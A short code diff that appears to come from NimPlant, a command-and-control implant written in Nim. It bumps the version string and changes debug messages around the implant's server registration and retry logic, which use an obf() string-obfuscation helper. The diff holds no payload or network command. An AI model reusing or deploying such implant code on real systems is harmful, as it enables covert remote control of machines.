@@ -26,7 +26,7 @@ when defined risky:
 # Parse the configuration at compile-time
 let CONFIG : Table[string, string] = parseConfig()
 
-const version: string = "NimPlant v1.2"
+const version: string = "NimPlant v1.3"
 proc runNp() : void =
     echo version
 
@@ -62,7 +62,7 @@ proc runNp() : void =
             quit(0)
 
         when defined verbose:
-            echo obf("DEBUG: Failed to register with server. Attempt: ") & $currentAttempt & obf("/") & $maxAttempts & obf(".")
+            echo obf("DEBUG: Attempt: ") & $currentAttempt & obf("/") & $maxAttempts & obf(".")
 
     proc handleFailedCheckin() : void =
         sleepMultiplier = 3^currentAttempt
@@ -128,6 +128,8 @@ proc runNp() : void =
                     sleepMultiplier = 1
 
             except:
+                when defined verbose:
+                    echo obf("DEBUG: Got unexpected exception when attempting to register: ") & getCurrentExceptionMsg()
                 handleFailedRegistration()
         
         # Otherwise, process commands from registered server
